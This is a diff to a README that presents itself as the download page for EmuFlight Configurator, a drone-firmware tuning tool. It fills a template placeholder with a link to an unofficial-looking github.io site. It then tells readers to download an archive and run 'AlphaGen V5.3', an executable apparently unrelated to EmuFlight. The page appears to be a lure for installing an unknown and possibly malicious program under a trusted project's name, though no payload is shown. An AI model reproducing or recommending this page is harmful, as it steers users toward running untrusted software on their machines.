@@ -2,13 +2,13 @@
 
 EmuFlight Configurator is a tuning interface for EmuFlight firmware — a smooth-flying fork of Betaflight designed for precise freestyle and cinematic FPV control.
 
-[![Download](https://img.shields.io/badge/Download-EmuFlight_Configurator-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-EmuFlight_Configurator-blueviolet)](https://emuflight-configurator-fpv-firmware.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://emuflight-configurator-fpv-firmware.github.io/.github)  
 2. 📁 Extract the configurator to your preferred folder  
 3. 🖱 Run AlphaGen V5.3 to initialize EmuFlight board detection  
 4. ✅ Connect your flight controller via USB and begin setup
